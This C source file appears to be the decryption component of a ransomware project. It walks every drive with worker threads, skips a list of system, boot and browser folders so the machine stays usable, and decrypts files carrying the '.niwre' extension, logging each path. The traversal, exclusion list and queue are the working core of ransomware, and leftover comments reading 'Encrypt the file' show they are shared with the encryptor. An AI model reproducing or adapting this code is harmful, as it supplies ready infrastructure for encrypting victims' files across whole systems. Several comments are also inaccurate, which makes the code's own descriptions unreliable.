#include "list_files.h"
#include "decrypt.h"

Queue* head = NULL;
Queue* tail = NULL;
CRITICAL_SECTION critSec;

void enqueue(WCHAR* directoryPath) // Add a directory/file to the queue
{
    EnterCriticalSection(&critSec);
    Queue* newNode = (Queue*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Queue)); // Allocate memory for the new node
    _wcscpy_s(newNode->directoryPath, MAX_PATH, directoryPath); // Copy the directory path
    newNode->next = NULL; // Set the next node to NULL

    if(tail != NULL) // Check if the directory is already in the queue
    {
        if(_wcscmp(tail->directoryPath, directoryPath) == 0) // Check if the directory is already in the queue
        {
            LeaveCriticalSection(&critSec);
            return;
        }
    }

    if (tail == NULL) { // If the queue is empty
        head = newNode; // Set the head and tail to the new node
        tail = newNode; // Set the head and tail to the new node
    }
    else {
        tail->next = newNode; // Add the new node to the end of the queue
        tail = tail->next; // Set the tail to the new node
    }

    LeaveCriticalSection(&critSec);
}

BOOL dequeue(WCHAR* directoryPath) // Remove a directory/file from the queue
{
    BOOL success = FALSE;

    EnterCriticalSection(&critSec);

    if (head != NULL) { // If the queue is not empty
        Queue* temp = head; // Save the head node
        _wcscpy_s(directoryPath, MAX_PATH, head->directoryPath); // Copy the directory path

        head = head->next; // Move the head node to the next node

        if (head == NULL) { // If the queue is empty
            tail = NULL; // Set the tail to NULL
        }

        HeapFree(GetProcessHeap(), 0, temp); // Free the memory
        success = TRUE; // Return success
    }

    LeaveCriticalSection(&critSec);

    return success;
}

void SearchDirectories(WCHAR* lpFolder) // Depth-first search (DFS) algorithm
{

    //MessageBoxW(NULL, lpFolder, L"SearchDirectories", MB_OK);

    enqueue(lpFolder); // Add the current directory to the queue

    const WCHAR* blacklist[] = {
        L"Windows", L"Boot", L"AppData", L"Tor Browser", L"Internet Explorer", 
        L"Google", L"Opera", L"Opera Software", L"Opera", L"Opera",
        L"Mozilla", L"Mozilla Firefox", L"$Recycle.Bin", L"All Users",
        L"Program Files", L"Program Files (x86)", L"ProgramData", L"#recycle", 
        L"System Volume Information", L"autorun.inf", L"Windows.old", L"Windows10Upgrade",
        L"boot.ini", L"bootfont.bin", L"bootsect.bak", L"bootmgr", L"bootmgr.efi",
        L"bootmgfw.efi", L"desktop.ini", L"iconcache.db", L"ntldr", L"ntuser.dat",
        L"ntuser.dat.log", L"ntuser.ini", L"thumbs.db", 0
    }; // Blacklisted directories
    int blacklist_count = sizeof(blacklist) / sizeof(blacklist[0]);
    HANDLE hFind;
    WIN32_FIND_DATA ffd;
    WCHAR szDir[MAX_PATH];

    _StringCchCopyW(szDir, MAX_PATH, lpFolder); // Copy the folder path
    if (FAILED(_StringCchCatW(szDir, MAX_PATH, L"\\*"))) // Append the wildcard character
    {
        return;
    }

    hFind = FindFirstFileExW(szDir, FindExInfoStandard, &ffd, FindExSearchNameMatch, NULL, 0);
    if (INVALID_HANDLE_VALUE == hFind && GetLastError() != ERROR_ACCESS_DENIED && GetLastError() != ERROR_PATH_NOT_FOUND)
    {
        writeToConsoleW(L"FindFirstFileExW failed! (SearchDirectories)\n");
        return;
    }

    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
        {
            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
            {
                // The folder is a junction, skip it
                continue;
            }
            
            if (_wcscmp(ffd.cFileName, L".") && _wcscmp(ffd.cFileName, L"..")) // Skip the current and parent directories
            {
                BOOL isBlacklisted = FALSE;
                // Check if the directory name is blacklisted
                for (int i = 0; i < blacklist_count; i++)
                {
                    if (!lstrcmpiW(ffd.cFileName, blacklist[i])) // If yes then skip it
                    {
                        isBlacklisted = TRUE;
                        break;
                    }
                }

                if (isBlacklisted) // Skip the blacklisted directories
                {
                    continue;
                }

                WCHAR subDir[MAX_PATH];
                _StringCchCopyW(subDir, MAX_PATH, lpFolder);
                if (FAILED(_StringCchCatW(subDir, MAX_PATH, L"\\")))
                {
                    continue;
                }
                if (FAILED(_StringCchCatW(subDir, MAX_PATH, ffd.cFileName))) // Append the subdirectory name
                {
                    continue;
                }
                enqueue(subDir);
                SearchDirectories(subDir); // Recursively search the subdirectory
            }
        }
    } while (FindNextFileW(hFind, &ffd) != 0);

    FindClose(hFind);
}

DWORD WINAPI SearchFilesThread(LPVOID lpParam) // Thread that searches for directories and appends them to the queue
{
    FileSearch* data = (FileSearch*)lpParam;
    if (data->lpFolder == NULL) // If the user didn't specify a directory
    {
        SearchDirectories(data->drive);
    }
    else
    {
        SearchDirectories(data->lpFolder);
    }

    HeapFree(GetProcessHeap(), 0, data);
    return 0;
}

DWORD WINAPI workerThread(LPVOID lpParam) // Thread that uses the queue to search for files inside directories
{
    HANDLE hFile = (HANDLE)lpParam;
    WCHAR directoryPath[MAX_PATH];
    WIN32_FIND_DATA ffd;
    HANDLE hFind;

    WCHAR *fileBufferUNC = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (4096*sizeof(WCHAR)));

    if (!fileBufferUNC) {
        writeToConsoleW(L"Failed to allocate memory for long path buffer.\n");
        return -1; // Memory allocation failed
    }

    while(dequeue(directoryPath))
    {
        WCHAR szDir[MAX_PATH] = { 0 };
        WCHAR fileBuffer[MAX_PATH] = { 0 };
        BOOL status = FALSE;

        memset_own(fileBufferUNC, 0, (4096*sizeof(WCHAR)));

        _StringCchCopyW(szDir, MAX_PATH, directoryPath); // Copy the folder path
        if (FAILED(_StringCchCatW(szDir, MAX_PATH, L"\\*"))) // Append the wildcard character
        {
            HeapFree(GetProcessHeap(), 0, fileBufferUNC); // Clean up before exiting
            return -1;
        }

        hFind = FindFirstFileExW(szDir, FindExInfoBasic, &ffd, FindExSearchLimitToDirectories, NULL, 0);
        if (INVALID_HANDLE_VALUE == hFind && GetLastError() != ERROR_ACCESS_DENIED && GetLastError() != ERROR_PATH_NOT_FOUND)
        {
            writeToConsoleW(L"FindFirstFileExW failed! (workerThread)\n");
            HeapFree(GetProcessHeap(), 0, fileBufferUNC); // Clean up before exit
            return -1;
        }

        do {
            // Extract the extension of the file
            PWSTR fileExtension = PathFindExtensionW(ffd.cFileName);

            // Check against .niwre first
            if (fileExtension && _wcscmp(fileExtension, L".niwre") == 0)
            {
                size_t len = _wcslen(directoryPath);
                size_t len2 = _wcslen(ffd.cFileName);
                size_t len3 = len + len2 + 1;
                if(len3 > MAX_PATH) // Check if the file path is greater then MAX_PATH
                {
                    _StringCchCopyW(fileBufferUNC, 4096, L"\\\\?\\"); // Copy the folder path
                    _StringCchCatW(fileBufferUNC, 4096, directoryPath); // Copy the folder path
                    _StringCchCatW(fileBufferUNC, 4096, L"\\");
                    _StringCchCatW(fileBufferUNC, 4096, ffd.cFileName); // Append the file name
                    status = DecryptWholeFileW(fileBufferUNC); // Encrypt the file
                    if(status)
                    {
                        _StringCchCatW(fileBufferUNC, 4096, L"\n");
                        EnterCriticalSection(&critSec);
                        DWORD dwBytesWritten = 0;
                    
                        WriteFile(hFile, fileBufferUNC, (DWORD)(_wcslen(fileBufferUNC) * sizeof(WCHAR)), &dwBytesWritten, NULL); // Write the file path to the log file
                        writeToConsoleW(fileBufferUNC); // Write the file path to the console
                        LeaveCriticalSection(&critSec);
                    }
                    else
                    {
                        writeToConsoleW(L"Failed to decrypt file: ");
                        writeToConsoleW(fileBufferUNC);
                    }
                }
                else
                {
                    _StringCchCopyW(fileBuffer, MAX_PATH, directoryPath); // Copy the folder path
                    _StringCchCatW(fileBuffer, MAX_PATH, L"\\");
                    _StringCchCatW(fileBuffer, MAX_PATH, ffd.cFileName); // Append the file name

                    status = DecryptWholeFileW(fileBuffer); // Encrypt the file
                    if(status)
                    {
                        _StringCchCatW(fileBuffer, MAX_PATH, L"\n");
                        EnterCriticalSection(&critSec);
                        DWORD dwBytesWritten2 = 0;
                        
                        WriteFile(hFile, fileBuffer, (DWORD)(_wcslen(fileBuffer) * sizeof(WCHAR)), &dwBytesWritten2, NULL); // Write the file path to the log file
                        writeToConsoleW(fileBuffer); // Write the file path to the console
                        LeaveCriticalSection(&critSec);
                    }
                    else
                    {
                        writeToConsoleW(L"Failed to decrypt file: ");
                        writeToConsoleW(fileBuffer);
                    }
                }
            }
        } while (FindNextFileW(hFind, &ffd) != 0);

        FindClose(hFind);
    }

    HeapFree(GetProcessHeap(), 0, fileBufferUNC); // Clean up before exit
    return 0;
}

int ExecuteSearchFile(PWSTR lpDirectory)
{
    HANDLE hThreads[26], hThread, workerThreadHandles[MAX_QUEUE_SIZE];
    DWORD ThreadId, threadId;
    int numThreads = 0;
    DWORD drives = GetLogicalDrives();
    HANDLE hFile;

    WCHAR logFileName[MAX_PATH];
    SYSTEMTIME lt;
    GetLocalTime(&lt);

    // Format the log file name as "log_YYYYMMDD.txt"
    wsprintfW(logFileName, L"debug_log_dec_%02d-%02d-%04d.txt", lt.wDay, lt.wMonth, lt.wYear);

    writeToConsoleW(L"\nLog File: ");
    writeToConsoleW(logFileName);
    writeToConsoleW(L"\n");

    // Create or open the log file
    hFile = CreateFileW(logFileName, FILE_APPEND_DATA, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // Create the log file

    if(hFile == INVALID_HANDLE_VALUE)
    {
        writeToConsoleA("Failed to create log file!\n");
        return 1;
    }

    // Initialize the critical section
    InitializeCriticalSection(&critSec);
    // Force code into memory, so we don't see any effects of paging.
    EnterCriticalSection(&critSec);
    LeaveCriticalSection(&critSec);

    LARGE_INTEGER frequency, start, end;
    QueryPerformanceFrequency(&frequency); // Get the frequency of the performance counter

	QueryPerformanceCounter(&start); // Start the timer

    size_t sourceLen = _wcslen(lpDirectory); // Get the length of the directory path

    if (lpDirectory != NULL && sourceLen >= 2) // If the user specified a directory
    {
        if(lpDirectory[sourceLen - 1] == L'\\') // Check if the directory path ends with a backslash
        {
            lpDirectory[sourceLen - 1] = L'\0'; // Remove the backslash
            sourceLen--; // Decrement the length
        }
        writeToConsoleA("Enumerating Specified Folder!\n");
        FileSearch* data = (FileSearch*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FileSearch));
        data->lpFolder = lpDirectory;
        // Create a new thread for the specified directory
        hThread = CreateThread(NULL, 0, SearchFilesThread, (LPVOID)data, 0, &ThreadId);

        if (hThread != NULL)
        {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
    }
    else // If the user didn't specify a directory (search all drives
    {
        writeToConsoleA("Enumerating all Drives!\n");
        for (int i = 0; i < 26; i++) // Iterate through all the drives 26 = (A-Z) drives
        {
            if (drives & (1 << i)) // Check if the drive exists
            {
                FileSearch* data = (FileSearch*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FileSearch));
                data->drive[0] = L'A' + i; // Set the drive letter
                data->drive[1] = L':';
                data->drive[2] = L'\0';
                data->lpFolder = NULL;
                
                // Create a new thread for each drive letter
                hThreads[numThreads] = CreateThread(NULL, 0, SearchFilesThread, (LPVOID)data, 0, &ThreadId);

                if (hThreads[numThreads] != NULL)
                {
                    numThreads++;
                }
            }
        }

        WaitForMultipleObjects(numThreads, hThreads, TRUE, INFINITE);
        // Close all the thread handles
        for (int d = 0; d < numThreads; d++)
        {
            CloseHandle(hThreads[d]);
        }
    }

    writeToConsoleW(L"File Decryption Started!\n");

    // create worker threads
    for (int k = 0; k < MAX_QUEUE_SIZE; k++) {
        workerThreadHandles[k] = CreateThread(NULL, 0, workerThread, hFile, 0, &threadId);
    }

    // wait for all worker threads to finish
    WaitForMultipleObjects(MAX_QUEUE_SIZE, workerThreadHandles, TRUE, INFINITE);

    // Close all the thread handles
    for (int x = 0; x < MAX_QUEUE_SIZE; x++)
    {
        CloseHandle(workerThreadHandles[x]);
    }

    DeleteCriticalSection(&critSec); // Delete the critical section
    CloseHandle(hFile); // Close the log file

    writeToConsoleW(L"File Decryption Finished!\n");

    QueryPerformanceCounter(&end);
    double time_elapsed = (end.QuadPart - start.QuadPart) * 1.0 / frequency.QuadPart;
    WCHAR time[20];
    WCHAR message[MAX_PATH];
    ftoa(time_elapsed, time, 4); // Convert the time to a string
    _StringCchCopyW(message, MAX_PATH, L"\nSearch completed in ");
    _StringCchCatW(message, MAX_PATH, time);
    _StringCchCatW(message, MAX_PATH, L" seconds.\n");
    writeToConsoleW(message);

    return 0;
}